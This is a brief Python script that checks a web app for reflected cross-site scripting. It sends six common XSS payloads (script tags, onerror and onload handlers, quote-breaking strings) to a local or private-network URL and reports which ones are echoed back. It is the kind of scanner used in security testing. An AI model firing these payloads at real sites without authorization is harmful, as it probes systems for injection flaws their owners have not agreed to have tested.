import requests

# Define the target URL (replace with the actual URL of the web app you are testing)
target_url = "http://127.0.0.1:5000/?name="
target_url = "http://192.168.1.60/"

# Common XSS payloads for testing
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "';alert('XSS');//",
    "\";alert('XSS');//",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
]

def test_xss_vulnerability():
    for payload in xss_payloads:
        # Send request with the payload
        url = target_url + requests.utils.quote(payload)
        response = requests.get(url)
        
        # Check if the payload is reflected in the response
        if payload in response.text:
            print(f"Potential XSS vulnerability detected with payload: {payload}")
        else:
            print(f"Payload did not trigger XSS: {payload}")

if __name__ == "__main__":
    test_xss_vulnerability()

